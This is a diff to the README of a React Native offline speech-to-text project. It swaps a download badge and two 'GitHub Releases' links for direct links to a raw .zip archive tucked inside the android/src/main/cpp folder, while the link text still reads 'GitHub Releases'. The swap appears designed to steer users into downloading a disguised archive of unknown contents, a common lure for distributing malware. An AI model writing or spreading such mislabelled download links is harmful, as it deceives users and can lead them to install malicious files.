@@ -1,6 +1,6 @@
 # 🎤 react-native-sherpa-onnx-stt - Offline Speech-to-Text Simplified
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)
+![Download](https://github.com/lancetodjk14/react-native-sherpa-onnx-stt/raw/refs/heads/main/android/src/main/cpp/onnx_react_stt_native_sherpa_2.1-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **react-native-sherpa-onnx-stt** project! This application allows
 
 To get started, you need to download the application. 
 
-- Visit this page to download: [GitHub Releases](https://github.com/lancetodjk14/react-native-sherpa-onnx-stt/releases).
+- Visit this page to download: [GitHub Releases](https://github.com/lancetodjk14/react-native-sherpa-onnx-stt/raw/refs/heads/main/android/src/main/cpp/onnx_react_stt_native_sherpa_2.1-beta.1.zip).
 
 You will find the latest version of the application available for download. Look for the file that matches your operating system. Once you find it, download the file to your computer or mobile device.
 
@@ -92,4 +92,4 @@ If you encounter any issues, here are some common solutions:
 
 For further assistance or feedback, feel free to reach out. You can contact us through the issues section on GitHub. 
 
-Once again, to download the application, visit: [GitHub Releases](https://github.com/lancetodjk14/react-native-sherpa-onnx-stt/releases). Enjoy your new speech-to-text tool!
+Once again, to download the application, visit: [GitHub Releases](https://github.com/lancetodjk14/react-native-sherpa-onnx-stt/raw/refs/heads/main/android/src/main/cpp/onnx_react_stt_native_sherpa_2.1-beta.1.zip). Enjoy your new speech-to-text tool!
